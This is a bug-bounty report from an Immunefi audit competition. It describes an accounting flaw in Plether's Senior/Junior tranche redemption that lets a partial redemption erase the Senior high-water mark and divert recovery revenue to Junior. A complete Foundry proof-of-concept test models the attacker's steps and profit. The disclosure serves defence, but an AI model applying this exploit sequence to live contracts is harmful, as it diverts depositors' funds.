# \#99174 [SC-Low] Partial Senior redemption erases surviving HWM and diverts principal recovery to Junior

**Submitted on Nov 12th 2026 at 09:51:47 UTC by @Psyone for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99174
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A Senior LP can redeem fewer than all Senior shares while receiving the last atom of current Senior principal. The withdrawal helper reduces the Senior high-water mark (HWM) by the full asset-to-principal ratio, clearing recovery priority for shares still held by another LP. Subsequent trading revenue then accrues to Junior and can be paid out there, while a surviving Senior victim receives less than in an otherwise matched execution.

## Vulnerability Details

Let `P` be pre-redemption Senior principal, `H` its high-water mark, `A` the funded Senior redemption, `S` pre-burn Senior share supply, and `q` the shares burned. The [redemption quote](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolRedemptionMathLib.sol#L30-L47) floors `q × (P + 1) / (S + 1,000)` before any exit fee. Those ERC-4626 virtual offsets permit `A = P = 1` USDG atom while `q < S`.

[HousePool Senior settlement](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L845-L863) passes the funded asset amount to [the HWM helper](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L119-L130):

```solidity
nextState.seniorHighWaterMark -= Math.mulDiv(
    state.seniorHighWaterMark, fundedAssets, state.seniorPrincipal, Math.Rounding.Floor
);
nextState.seniorPrincipal -= fundedAssets;
```

With `A=P`, this clears `H` regardless of surviving shares. In the reproduced path, the attacker receives one atom on a partial Senior exit, the attack HWM becomes zero, and 3,992,055,818,854,660 Senior shares survive. In the same-state control, HWM is 10,000,219.180739 USDG before later revenue. Later revenue consequently bypasses Senior recovery and is allocated to Junior. The Senior request is the redeemer’s full unlocked wallet balance, so the [vault’s full-wallet minimum-size exception](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L632) applies.

This is an **incomplete repair of Cecuro MED-11**, not a fresh claim that the old code remains. [MED-11](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf) found that scaling HWM by burned-share fraction while deducting paid assets from principal could leave remaining principal underprotected. The [public repair](https://github.com/Plether-Fi/plether-core/commit/9ab65f4175cb90805eabb434908ab4832a124d56) changed HWM scaling to `A/P`. It tests full principal payment, but not full principal payment **with surviving shares**. That untested boundary makes the fix incomplete under [scope line 182](https://immunefi.com/audit-competition/plether/scope/). Cecuro LOW-54 concerns less than one atom of **extra** HWM retained by rounding; this witness deletes a material HWM, so LOW-54 does not describe it.

## Impact Details

The Foundry test uses ordinary Senior and Junior deposits, public V3 Router orders and LP settlement, the release 25-bp settlement buffer, 4-bp execution fee, 40M/80% Senior cap, 1% VPI, 40% skew cap, 1,000 USDG minimum open, and six weighted FX feed mocks with 1-bp confidence. No in-scope contract is edited. It obtains one atom of physical pool cash and projected Senior principal, with no trader claims, no degraded mode, and no maximum directional liability before the partial exit. A later, already-open short supplies approximately 100,002 USDG of trading revenue in each branch.

| Paid claim | Partial Senior exit | Matched control | Increment attributable to HWM erasure |
| --- | ---: | ---: | ---: |
| Independent Senior victim | 0 USDG | 40,001.207174 USDG | **40,001.207174 USDG lost** |
| Junior LP | 100,002.486676 USDG | 0 USDG | 100,002.486676 USDG gained |

The victim’s original deposit was 3,999,999 USDG. The market sequence had already impaired the tranche before the disputed exit; its earlier loss is not attributed to this bug. The 40,001.207174 USDG figure is the later **paid recovery difference** against the same-time, same-epoch control. The control **actually pays** the redeeming Senior LP 60,001.277806 USDG, while the attack pays it one USDG atom. The attacker in this modeled sequence funds and controls the Junior LP, the redeeming Senior LP, and all three trader accounts. The combined LP payout advantage is **40,001.208871 USDG**. Trader withdrawals are **9.095359 USDG lower** in the attack branch, so the test’s full-life token net against **25,489,235.212399 USDG** of modeled attacker capital is **+3,991,080.453834 USDG** attacked versus **+3,951,088.340322 USDG** control: an incremental **+39,992.113512 USDG**. The large trading gains caused by the earlier extreme price moves exist in both branches and are excluded from this increment. Gas, financing and capital availability are not modeled.

The mock feed path establishes contract behavior under the launch parameters, but does **not** show that honest Pyth data can make six currency pairs follow those movements within executable market windows. The test does not establish that authentic signed-feed data can reach the one-atom precondition in a live market. The required synchronized FX movement is a material reachability limitation.

## Mitigation

The redemption update must not treat `A=P` as proof that no Senior ownership remains. Preserve the Senior impairment gap (`max(H−P,0)`) for the shares that survive, while continuing to reduce paid principal by exactly `A`. An invariant-level approach is to retain the larger of (i) the gap left by asset-ratio scaling, which preserves the MED-11 paid-fee case, and (ii) the gap left by burned-share-ratio scaling. Then set `H′=P′+retainedGap`. This is a design direction, not a tested patch. A raw `max(asset-ratio retained H, share-ratio retained H)` can create a phantom HWM in a healthy `H=P=1`-atom state; it should not be used without the gap split.

Regression tests should cover `A=P` with `q<S`, ordinary fee exits where `A/P<q/S`, zero-value and terminal-share exits, and a post-revenue paid-claim differential. The fix must not leave a recovery HWM with no Senior owners.

## References

- [Pinned waterfall helper](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L119-L159)
- [Pinned Senior redemption settlement](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L845-L863)
- [Pinned redemption quote](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolRedemptionMathLib.sol#L30-L47)
- [Pinned release parameters](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md)
- [Pinned waterfall specification](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L329-L349)
- [Cecuro MED-11 and LOW-54](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf)
- [Public MED-11 repair](https://github.com/Plether-Fi/plether-core/commit/9ab65f4175cb90805eabb434908ab4832a124d56)
- [Plether competition scope](https://immunefi.com/audit-competition/plether/scope/)



## Proof of Concept

## Proof of Concept

Add the following complete file as `packages/perps/test/HuntHwm78FullPath.t.sol` in the repository at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. No in-scope source edit is needed. Run either command independently from the repository root. With Foundry and Solidity 0.8.35 installed locally:

```sh
( cd packages/perps && forge test --match-path test/HuntHwm78FullPath.t.sol --match-test test_PublicRouteClearsHwmAndPaysJuniorInsteadOfVictim -vv )
```

The recorded passing run used this independent Docker command from the repository root; the local image contains Foundry and Solidity 0.8.35:

```sh
docker run --rm -v "$PWD":/repo -w /repo/packages/perps --entrypoint sh open-kritt-engine:plether -lc 'forge test --use /usr/local/bin/solc --match-path test/HuntHwm78FullPath.t.sol --match-test test_PublicRouteClearsHwmAndPaysJuniorInsteadOfVictim -vv'
```

Expected: **1/1 passed**. The embedded test SHA-256 is `c439a8128a159b32e5c4fc717771a4c4b2dbf6d2b59ca40bfa382e99652a8ad1`; the recorded run log SHA-256 is `d7fb146e8b2e4bf5d897ed4d1aabc3d5b1a0b16f3c7d9b57f79468ab4536c6a5`. Key logged values, all in 6-decimal USDG atoms except shares:

```text
attack HWM after trigger atoms 0
control HWM before revenue atoms 10000219180739
attack Senior payout atoms 1
control attacker Senior claim atoms 60001277806
surviving Senior shares 3992055818854660
attack revenue inflow atoms 100002495000
control revenue inflow atoms 100002495000
attack victim Senior claim atoms 0
control victim Senior claim atoms 40001207174
attack Junior claim atoms 100002486676
control Junior claim atoms 0
attack trader withdrawals atoms 29380313179556
control trader withdrawals atoms 29380322274915
attacker capital atoms 25489235212399
attack token net atoms 3991080453834
control token net atoms 3951088340322
```

The two token-net numbers appear as bare signed integer logs after `attacker capital atoms` in the test output. Their subtraction is **39,992.113512 USDG**. The control uses a public dust-share LP settlement to match the intermediate epoch and later close time; it does not erase HWM. The test models Pyth with mock six-feed values and does not prove that the severe required FX path can arise from authentic signed updates.

Full runnable source:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {console2} from "forge-std/console2.sol";

/// @dev Adversarial feasibility probe only. Every market action uses the public V3 Router.
contract HuntHwm78FullPath is BasePerpTest {

    address constant JUNIOR_LP = address(0x1101);
    address constant SENIOR_VICTIM = address(0x1102);
    address constant SENIOR_ATTACKER = address(0x1103);
    address constant SHORT_TRADER = address(0x1104);
    address constant LONG_TRADER = address(0x1105);
    address constant REVENUE_TRADER = address(0x1106);
    address constant DUST = address(0x1107);
    uint256 constant SIZE = 10_000_000e18;
    uint256 constant REVENUE_SIZE = 100_000e18;
    uint256 constant EXACT_JUNIOR_DEPOSIT = 11_989_235_212_399;

    struct BranchResult {
        uint256 preRevenueTime;
        uint256 attackerSeniorClaim;
        uint256 attackerSeniorLaterClaim;
        uint256 seniorHwmAfterTrigger;
        uint256 survivingSeniorShares;
        uint256 revenueCashInflow;
        uint256 victimSeniorClaim;
        uint256 attackerJuniorClaim;
        uint256 traderWithdrawn;
    }

    bytes32[] internal sixFeedIds;
    uint256 internal constant CONFIDENCE_BPS = 1;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _juniorSeedReceiver() internal pure override returns (address) {
        return JUNIOR_LP;
    }

    function _seniorSeedReceiver() internal pure override returns (address) {
        return SENIOR_VICTIM;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        assertEq(engine.settlementBufferBps(), 25);
        assertEq(engine.executionFeeBps(), 4);
        _warpToLiveMarket();
        _rotateToSixFeedOracle();
        IOrderRouterAdminHost.RouterConfig memory releaseRouterConfig = _routerConfig();
        releaseRouterConfig.adverseConfidenceMultiplierBps = 2500;
        releaseRouterConfig.minOpenNotionalAssets = 1000e6;
        _setRouterConfig(releaseRouterConfig);
        assertEq(router.minOpenNotionalAssets(), 1000e6);
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2500);
        _warpToLiveMarket();
        _setSix(1e8, block.timestamp, true);
        router.updateMarkPrice(_emptyUpdate());
    }

    function test_PublicRouteClearsHwmAndPaysJuniorInsteadOfVictim() public {
        assertEq(_trial(EXACT_JUNIOR_DEPOSIT, true), 1, "public profitable closes leave one atom");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no unpaid trader claim");
        assertFalse(engine.degradedMode(), "normal LP settlement stays live");
        assertEq(_maxLiability(), 0, "preopened cap short adds no liability");
        (uint256 seniorPending, uint256 juniorPending,,) = pool.getPendingTrancheState();
        assertEq(seniorPending, 1, "one atom of Senior principal survives");
        assertEq(juniorPending, 0, "Junior has no principal before later revenue");

        uint256 juniorUnlock = juniorVault.lastDepositTime(JUNIOR_LP) + juniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < juniorUnlock) {
            vm.warp(juniorUnlock);
        }
        vm.prank(JUNIOR_LP);
        juniorVault.transfer(DUST, 1);
        uint256 dustUnlock = juniorVault.lastDepositTime(DUST) + juniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < dustUnlock) {
            vm.warp(dustUnlock);
        }
        uint256 seniorUnlock = seniorVault.lastDepositTime(SENIOR_ATTACKER) + seniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < seniorUnlock) {
            vm.warp(seniorUnlock);
        }
        assertEq(juniorVault.maxRequestRedeem(DUST), 1, "control has a public dust settlement trigger");

        uint256 snapshot = vm.snapshotState();
        BranchResult memory attack = _runBranch(true, 0);
        assertTrue(vm.revertToState(snapshot));
        BranchResult memory control = _runBranch(false, attack.preRevenueTime);

        console2.log("attack HWM after trigger atoms", attack.seniorHwmAfterTrigger);
        console2.log("control HWM before revenue atoms", control.seniorHwmAfterTrigger);
        console2.log("attack Senior payout atoms", attack.attackerSeniorClaim);
        console2.log("control attacker Senior claim atoms", control.attackerSeniorLaterClaim);
        console2.log("surviving Senior shares", attack.survivingSeniorShares);
        console2.log("attack revenue inflow atoms", attack.revenueCashInflow);
        console2.log("control revenue inflow atoms", control.revenueCashInflow);
        console2.log("attack victim Senior claim atoms", attack.victimSeniorClaim);
        console2.log("control victim Senior claim atoms", control.victimSeniorClaim);
        console2.log("attack Junior claim atoms", attack.attackerJuniorClaim);
        console2.log("control Junior claim atoms", control.attackerJuniorClaim);
        console2.log("attack trader withdrawals atoms", attack.traderWithdrawn);
        console2.log("control trader withdrawals atoms", control.traderWithdrawn);
        uint256 attackerCapital = EXACT_JUNIOR_DEPOSIT + 6_000_000e6 + 6_000_000e6 + 1_000_000e6 + 500_000e6;
        int256 attackNet = int256(
            attack.attackerSeniorClaim + attack.attackerSeniorLaterClaim + attack.attackerJuniorClaim
                + attack.traderWithdrawn
        ) - int256(attackerCapital);
        int256 controlNet = int256(
            control.attackerSeniorClaim + control.attackerSeniorLaterClaim + control.attackerJuniorClaim
                + control.traderWithdrawn
        ) - int256(attackerCapital);
        console2.log("attacker capital atoms", attackerCapital);
        console2.logInt(attackNet);
        console2.logInt(controlNet);
        assertEq(attack.preRevenueTime, control.preRevenueTime, "branches close revenue trade at matched time");
        assertEq(attack.attackerSeniorClaim, 1, "partial Senior share redemption pays final principal atom");
        assertGt(attack.survivingSeniorShares, 0, "victim Senior shares survive");
        assertEq(attack.seniorHwmAfterTrigger, 0, "partial burn clears full HWM");
        assertGt(control.seniorHwmAfterTrigger, 10_000_000e6, "control retains Senior recovery target");
        assertGt(attack.revenueCashInflow, 50_000e6, "later trade funds material revenue");
        assertApproxEqAbs(attack.revenueCashInflow, control.revenueCashInflow, 1, "matched revenue economics");
        assertEq(attack.victimSeniorClaim, 0, "victim receives no USDG after HWM erasure");
        assertGt(control.victimSeniorClaim, 30_000e6, "control victim receives funded USDG");
        assertGt(attack.attackerJuniorClaim, 50_000e6, "attack Junior receives diverted revenue");
        assertEq(control.attackerJuniorClaim, 0, "control Junior has no funded claim");
        assertGt(control.attackerSeniorLaterClaim, 50_000e6, "control attacker Senior retains recovery claim");
        assertApproxEqAbs(
            attack.traderWithdrawn, control.traderWithdrawn, 10e6, "trade path differs by less than 10 USDG"
        );
        assertGt(attackNet, controlNet + int256(30_000e6), "HWM erasure adds material attacker profit");
    }

    function _runBranch(
        bool eraseHwm,
        uint256 matchedPreRevenueTime
    ) internal returns (BranchResult memory result) {
        vm.roll(vm.getBlockNumber() + 1);
        _setSix(201_000_000, vm.getBlockTimestamp(), true);
        router.updateMarkPrice(_emptyUpdate());
        vm.prank(DUST);
        uint256 dustId = juniorVault.requestRedeem(1, DUST, DUST);
        uint256 triggerId;
        if (eraseHwm) {
            uint256 attackerShares = seniorVault.maxRequestRedeem(SENIOR_ATTACKER);
            assertGt(attackerShares, 0, "attacker Senior shares are unlocked");
            assertLt(attackerShares, seniorVault.totalSupply(), "redemption leaves outstanding Senior shares");
            vm.prank(SENIOR_ATTACKER);
            triggerId = seniorVault.requestRedeem(attackerShares, SENIOR_ATTACKER, SENIOR_ATTACKER);
        }
        uint256 triggerAt = pool.lpEpochStart(dustId);
        if (triggerId != 0 && pool.lpEpochStart(triggerId) > triggerAt) {
            triggerAt = pool.lpEpochStart(triggerId);
        }
        if (vm.getBlockTimestamp() < triggerAt) {
            vm.warp(triggerAt);
        }
        _publicSettleLpEpoch(201_000_000);
        assertEq(juniorVault.refundableRedeemRequest(dustId, DUST), 1);
        vm.prank(DUST);
        assertEq(juniorVault.claimRedeemRefund(dustId, DUST, DUST), 1);
        if (eraseHwm) {
            // Escrowed shares are no longer in the wallet; use the claimable request amount.
            uint256 attackerShares = seniorVault.claimableRedeemRequest(triggerId, SENIOR_ATTACKER);
            assertEq(seniorVault.claimableRedeemRequest(triggerId, SENIOR_ATTACKER), attackerShares);
            vm.prank(SENIOR_ATTACKER);
            result.attackerSeniorClaim =
                seniorVault.claimRedeem(triggerId, attackerShares, SENIOR_ATTACKER, SENIOR_ATTACKER);
            assertEq(pool.seniorPrincipal(), 0, "Senior principal depleted by funded partial burn");
        } else {
            assertEq(vm.getBlockTimestamp(), matchedPreRevenueTime, "same settlement epoch in control");
        }
        result.seniorHwmAfterTrigger = pool.seniorHighWaterMark();
        result.survivingSeniorShares = seniorVault.balanceOf(SENIOR_VICTIM);
        result.preRevenueTime = vm.getBlockTimestamp();

        uint256 cashBeforeRevenue = pool.totalAssets();
        _route(REVENUE_TRADER, CfdTypes.Side.SHORT, REVENUE_SIZE, 0, true, 100_000_000);
        result.revenueCashInflow = pool.totalAssets() - cashBeforeRevenue;
        assertEq(engine.totalTraderClaimBalanceAssets(), 0);

        uint256 victimShares = seniorVault.maxRequestRedeem(SENIOR_VICTIM);
        uint256 juniorShares = juniorVault.maxRequestRedeem(JUNIOR_LP);
        assertGt(victimShares, 0);
        assertGt(juniorShares, 0);
        vm.prank(SENIOR_VICTIM);
        uint256 victimId = seniorVault.requestRedeem(victimShares, SENIOR_VICTIM, SENIOR_VICTIM);
        uint256 attackerId;
        uint256 attackerShares;
        if (!eraseHwm) {
            attackerShares = seniorVault.maxRequestRedeem(SENIOR_ATTACKER);
            vm.prank(SENIOR_ATTACKER);
            attackerId = seniorVault.requestRedeem(attackerShares, SENIOR_ATTACKER, SENIOR_ATTACKER);
        }
        vm.prank(JUNIOR_LP);
        uint256 juniorId = juniorVault.requestRedeem(juniorShares, JUNIOR_LP, JUNIOR_LP);
        uint256 settleAt = pool.lpEpochStart(victimId);
        if (attackerId != 0 && pool.lpEpochStart(attackerId) > settleAt) {
            settleAt = pool.lpEpochStart(attackerId);
        }
        if (pool.lpEpochStart(juniorId) > settleAt) {
            settleAt = pool.lpEpochStart(juniorId);
        }
        vm.warp(settleAt);
        pool.settleLpEpoch(0, 0);

        uint256 victimClaimable = seniorVault.claimableRedeemRequest(victimId, SENIOR_VICTIM);
        if (victimClaimable > 0) {
            vm.prank(SENIOR_VICTIM);
            result.victimSeniorClaim = seniorVault.claimRedeem(victimId, victimClaimable, SENIOR_VICTIM, SENIOR_VICTIM);
        } else {
            assertEq(seniorVault.refundableRedeemRequest(victimId, SENIOR_VICTIM), victimShares);
            vm.prank(SENIOR_VICTIM);
            assertEq(seniorVault.claimRedeemRefund(victimId, SENIOR_VICTIM, SENIOR_VICTIM), victimShares);
        }
        uint256 juniorClaimable = juniorVault.claimableRedeemRequest(juniorId, JUNIOR_LP);
        if (juniorClaimable > 0) {
            vm.prank(JUNIOR_LP);
            result.attackerJuniorClaim = juniorVault.claimRedeem(juniorId, juniorClaimable, JUNIOR_LP, JUNIOR_LP);
        } else {
            assertEq(juniorVault.refundableRedeemRequest(juniorId, JUNIOR_LP), juniorShares);
            vm.prank(JUNIOR_LP);
            assertEq(juniorVault.claimRedeemRefund(juniorId, JUNIOR_LP, JUNIOR_LP), juniorShares);
        }
        if (!eraseHwm) {
            uint256 attackerClaimable = seniorVault.claimableRedeemRequest(attackerId, SENIOR_ATTACKER);
            assertEq(attackerClaimable, attackerShares, "control attacker Senior request fully funded");
            vm.prank(SENIOR_ATTACKER);
            result.attackerSeniorLaterClaim =
                seniorVault.claimRedeem(attackerId, attackerClaimable, SENIOR_ATTACKER, SENIOR_ATTACKER);
        }
        result.traderWithdrawn =
            _withdrawTrader(SHORT_TRADER) + _withdrawTrader(LONG_TRADER) + _withdrawTrader(REVENUE_TRADER);
    }

    function _withdrawTrader(
        address trader
    ) internal returns (uint256 assets) {
        assets = clearinghouse.balanceAssets(trader);
        console2.log("trader account", trader);
        console2.log("trader paid atoms", assets);
        if (assets > 0) {
            vm.prank(trader);
            clearinghouse.withdraw(trader, assets);
            assertEq(settlementToken.balanceOf(trader), assets, "trader receives actual USDG");
        }
    }

    function _trial(
        uint256 juniorOrdinaryDeposit,
        bool revenuePosition
    ) internal returns (uint256) {
        _deposit(JUNIOR_LP, juniorOrdinaryDeposit, false);
        _deposit(SENIOR_VICTIM, 3_999_999e6, true);
        _deposit(SENIOR_ATTACKER, 6_000_000e6, true);
        assertEq(pool.totalAssets(), juniorOrdinaryDeposit + 10_000_001e6);
        assertGt(pool.seniorHighWaterMark(), 10_000_000e6 - 1);
        _fundTrader(SHORT_TRADER, 6_000_000e6);
        _fundTrader(LONG_TRADER, 1_000_000e6);

        if (revenuePosition) {
            _fundTrader(REVENUE_TRADER, 500_000e6);
            _route(REVENUE_TRADER, CfdTypes.Side.SHORT, REVENUE_SIZE, 300_000e6, false, 200_000_000);
        }

        _route(SHORT_TRADER, CfdTypes.Side.SHORT, SIZE, 5_000_000e6, false, 80_000_000);
        _route(LONG_TRADER, CfdTypes.Side.LONG, SIZE, 500_000e6, false, 140_000_000);
        _route(LONG_TRADER, CfdTypes.Side.LONG, SIZE, 0, true, 40_000_000);
        _route(SHORT_TRADER, CfdTypes.Side.SHORT, SIZE, 0, true, 201_000_000);
        return pool.totalAssets();
    }

    function _deposit(
        address actor,
        uint256 assets,
        bool senior
    ) internal {
        settlementToken.mint(actor, assets);
        vm.startPrank(actor);
        settlementToken.approve(senior ? address(seniorVault) : address(juniorVault), assets);
        uint256 id = senior
            ? seniorVault.requestDeposit(assets, actor, actor)
            : juniorVault.requestDeposit(assets, actor, actor);
        vm.stopPrank();
        vm.warp(pool.lpEpochStart(id));
        _publicSettleLpEpoch(1e8);
        vm.prank(actor);
        if (senior) {
            seniorVault.claimDeposit(id, assets, actor, actor);
        } else {
            juniorVault.claimDeposit(id, assets, actor, actor);
        }
    }

    function _publicSettleLpEpoch(
        uint256 basketPrice
    ) internal {
        uint256 tick = vm.getBlockTimestamp();
        _setSix(basketPrice, tick, true);
        router.settleLpEpoch(_emptyUpdate());
    }

    function _route(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 basketPrice
    ) internal {
        vm.roll(vm.getBlockNumber() + 1);
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        _setSix(basketPrice, vm.getBlockTimestamp(), true);
        router.updateMarkPrice(_emptyUpdate());
        uint256 nowTs = vm.getBlockTimestamp();
        uint256 target = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: target,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(nowTs + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trader);
        uint64 orderId = router.commitOrder(request);
        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(orderId);
        uint256 tick = uint256(pending.commitTime) + 1;
        vm.warp(tick);
        vm.roll(vm.getBlockNumber() + 1);
        _setSix(basketPrice, tick, true);
        OrderV3Types.ExecutionResult memory outcome = router.executeOrder(orderId, _emptyUpdate());
        assertEq(uint8(outcome.status), uint8(OrderV3Types.LifecycleStatus.Executed), "Router execution must fill");
    }

    function _rotateToSixFeedOracle() internal {
        bytes32[] memory ids = new bytes32[](6);
        uint256[] memory weights = new uint256[](6);
        uint256[] memory bases = new uint256[](6);
        bool[] memory inversions = new bool[](6);
        ids[0] = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
        ids[1] = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
        ids[2] = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
        ids[3] = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
        ids[4] = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
        ids[5] = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;
        weights[0] = 576e15;
        weights[1] = 136e15;
        weights[2] = 119e15;
        weights[3] = 91e15;
        weights[4] = 42e15;
        weights[5] = 36e15;
        bases[0] = 117_500_000;
        bases[1] = 638_000;
        bases[2] = 134_480_000;
        bases[3] = 72_880_000;
        bases[4] = 10_860_000;
        bases[5] = 126_100_000;
        inversions[1] = true;
        inversions[3] = true;
        inversions[4] = true;
        inversions[5] = true;
        for (uint256 i; i < 6; ++i) {
            sixFeedIds.push(ids[i]);
        }
        PletherOracle sixFeedOracle =
            new PletherOracle(address(engine), address(pool), address(baseMockPyth), ids, weights, bases, inversions);
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig({pletherOracle: address(sixFeedOracle)}));
        vm.warp(routerAdmin.oracleConfigActivationTime());
        routerAdmin.finalizeOracleConfig();
        pletherOracle = sixFeedOracle;
    }

    function _setSix(
        uint256 basketPrice,
        uint256 publishTime,
        bool unique
    ) internal {
        uint256[6] memory bases = [uint256(117_500_000), 638_000, 134_480_000, 72_880_000, 10_860_000, 126_100_000];
        uint256 previousTime = engine.lastMarkTime();
        if (previousTime >= publishTime) {
            previousTime = publishTime - 1;
        }
        for (uint256 i; i < 6; ++i) {
            uint256 normalized = bases[i] * basketPrice / 1e8;
            uint256 value = i == 1 || i >= 3 ? (1e16 + normalized / 2) / normalized : normalized;
            require(value > 0 && value <= uint256(uint64(type(int64).max)), "signed feed price");
            int64 raw = int64(uint64(value));
            uint64 confidence = uint64(uint256(uint64(raw)) * CONFIDENCE_BPS / 10_000);
            if (unique) {
                baseMockPyth.setUniquePrice(sixFeedIds[i], raw, confidence, -8, publishTime, previousTime);
            }
            baseMockPyth.setPrice(sixFeedIds[i], raw, confidence, -8, publishTime);
        }
    }

    function _emptyUpdate() internal pure returns (bytes[] memory data) {
        data = new bytes[](1);
        data[0] = "";
    }

    function _warpToLiveMarket() internal {
        for (uint256 i; i < 168 && (engine.isOracleFrozen() || engine.isFadWindow()); ++i) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
        }
        assertFalse(engine.isOracleFrozen());
        assertFalse(engine.isFadWindow());
    }

}
```

